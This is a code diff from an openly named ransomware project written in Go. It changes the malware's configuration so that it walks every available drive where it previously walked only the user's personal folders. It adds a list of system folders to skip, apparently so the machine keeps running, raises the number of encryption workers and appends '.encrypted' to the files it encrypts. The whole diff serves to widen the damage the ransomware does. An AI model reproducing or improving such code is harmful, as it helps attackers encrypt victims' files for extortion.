@@ -8,23 +8,32 @@ import (
 	"sync"
 
 	"github.com/mauri870/ransomware/cryptofs"
+	"github.com/mauri870/ransomware/utils"
 )
 
 var (
-	// Current user directory
-	UserDir = fmt.Sprintf("%s\\", os.Getenv("USERPROFILE"))
+	UserDir = fmt.Sprintf("%s\\", utils.GetCurrentUser().HomeDir)
 
 	// Temp Dir
 	TempDir = fmt.Sprintf("%s\\", os.Getenv("TEMP"))
 
 	// Directories to walk searching for files
-	InterestingDirs = []string{
-		UserDir + "Pictures",
-		UserDir + "Documents",
-		UserDir + "Music",
-		UserDir + "Desktop",
-		UserDir + "Downloads",
-		UserDir + "Videos",
+	// By default it will walk throught all available drives
+	InterestingDirs = utils.GetDrives()
+
+	// Folders to skip
+	SkippedDirs = []string{
+		"ProgramData",
+		"Windows",
+		"bootmgr",
+		"$WINDOWS.~BT",
+		"Windows.old",
+		"Temp",
+		"tmp",
+		"Program Files",
+		"Program Files (x86)",
+		"AppData",
+		"$Recycle.Bin",
 	}
 
 	// Interesting extensions to match files
@@ -82,7 +91,7 @@ var (
 	}()
 
 	// Workers processing the files
-	NumWorkers = 2
+	NumWorkers = 3
 
 	// Extension appended to files after encryption
 	EncryptionExtension = ".encrypted"
